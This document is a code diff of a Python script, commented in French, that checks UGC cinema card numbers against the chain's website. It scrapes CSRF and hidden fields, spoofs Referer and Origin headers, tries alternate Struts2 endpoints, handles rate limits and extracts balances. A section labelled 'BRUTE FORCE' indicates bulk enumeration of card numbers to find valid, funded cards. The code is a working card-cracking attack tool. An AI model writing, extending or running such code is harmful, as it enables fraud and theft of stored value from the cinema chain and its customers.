@@ -90,23 +90,79 @@ def probe_endpoint(sess):
         pass
     return ACTION_URL, dict(HIDDEN_BASE), CARD_FIELD, ""
 
+# Variantes Struts2 à essayer dans l'ordre
+ACTION_VARIANTS = [
+    "https://www.ugc.fr/offresCartesAction/valider.action",
+    "https://www.ugc.fr/offresCartesAction!valider.action",
+    "https://www.ugc.fr/offresCartes/valider.action",
+]
+
 def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> dict:
     num = str(num).strip()
     try:
-        # re-seed cookies pour chaque check
-        r0 = sess.get(PAGE_URL, timeout=10)
+        # ── étape 1: GET page pour seed session + récupérer form réel ──────────
+        r0 = sess.get(PAGE_URL, timeout=15, allow_redirects=True,
+                      headers={"Referer": "https://www.ugc.fr/"})
         if r0.status_code == 429:
             return {"num": num, "valid": None, "balance": None, "details": "RATE_LIMITED"}
 
-        # parse fresh CSRF
-        _, fresh_hidden, _ = parse_form(r0.text)
-        payload = dict(fresh_hidden)  # CSRF + autres hidden
-        payload[card_field] = num
+        # ── étape 2: parse le form HTML pour avoir l'action + hidden fields ─────
+        soup0    = BeautifulSoup(r0.text, "html.parser")
+        use_action = action
+        use_field  = card_field
+        payload    = dict(hidden)  # valeurs par défaut
 
-        r = sess.post(action, data=payload, timeout=12, allow_redirects=True)
+        for form in soup0.find_all("form"):
+            inp_names = [i.get("name","").lower() for i in form.find_all("input")]
+            if any("card" in n or "carte" in n or "numero" in n for n in inp_names):
+                # forme action → URL absolue
+                fa = form.get("action","").strip()
+                if fa:
+                    use_action = ("https://www.ugc.fr" + fa) if not fa.startswith("http") else fa
+                # récupère tous les hidden
+                payload = {}
+                for inp in form.find_all("input"):
+                    t  = inp.get("type","").lower()
+                    nm = inp.get("name","")
+                    if not nm:
+                        continue
+                    if t == "hidden":
+                        payload[nm] = inp.get("value","")
+                    if "card" in nm.lower() or "carte" in nm.lower() or "numero" in nm.lower():
+                        use_field = nm
+                break
+
+        # ── étape 3: construit le payload final ────────────────────────────────
+        payload[use_field] = num
+
+        # ── étape 4: POST avec Referer correct ──────────────────────────────────
+        post_headers = {
+            "Referer":      PAGE_URL,
+            "Origin":       "https://www.ugc.fr",
+            "Content-Type": "application/x-www-form-urlencoded",
+        }
+
+        # essaie d'abord l'action parsée, puis les variantes Struts2
+        candidates = [use_action] + [v for v in ACTION_VARIANTS if v != use_action]
+        r = None
+        for candidate in candidates:
+            try:
+                r = sess.post(candidate, data=payload, timeout=15,
+                              allow_redirects=True, headers=post_headers)
+                if r.status_code != 404:
+                    break
+            except Exception:
+                continue
+
+        if r is None:
+            return {"num": num, "valid": None, "balance": None, "details": "POST failed"}
 
         if r.status_code == 429:
             return {"num": num, "valid": None, "balance": None, "details": "RATE_LIMITED"}
+
+        if r.status_code == 404:
+            return {"num": num, "valid": None, "balance": None,
+                    "details": f"HTTP 404 — tous les endpoints ont échoué"}
 
         low  = r.text.lower()
         soup = BeautifulSoup(r.text, "html.parser")
@@ -115,27 +171,26 @@ def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> di
             return {"num": num, "valid": False, "balance": None, "details": "carte invalide"}
 
         if any(k in low for k in SUCCESS_KW):
-            # tente d'extraire le solde
             balance = None
-            for pat in [r"\d+[.,]\d+\s*€", r"€\s*\d+", r"\d+\s*places?"]:
+            for pat in [r"\d+[.,]\d+\s*€", r"€\s*\d+[.,]\d+", r"\d+\s*places?"]:
                 m = re.search(pat, r.text, re.I)
                 if m:
                     balance = m.group(0).strip()
                     break
-            # ou via element HTML
             if not balance:
                 for cls in ["solde","balance","credit","montant","places"]:
                     el = soup.find(class_=re.compile(cls, re.I))
                     if el:
                         balance = el.get_text(strip=True)[:50]
                         break
-            details = balance or "carte valide (solde non parsé)"
-            return {"num": num, "valid": True, "balance": balance, "details": details}
+            return {"num": num, "valid": True, "balance": balance,
+                    "details": balance or "carte valide (solde non parsé)"}
 
-        return {"num": num, "valid": None, "balance": None, "details": f"HTTP {r.status_code} ambigu"}
+        return {"num": num, "valid": None, "balance": None,
+                "details": f"HTTP {r.status_code} — réponse ambiguë"}
 
     except Exception as e:
-        return {"num": num, "valid": None, "balance": None, "details": str(e)[:60]}
+        return {"num": num, "valid": None, "balance": None, "details": str(e)[:80]}
 
 # ─── BRUTE FORCE ──────────────────────────────────────────────────────────────
 LOCK   = threading.Lock()
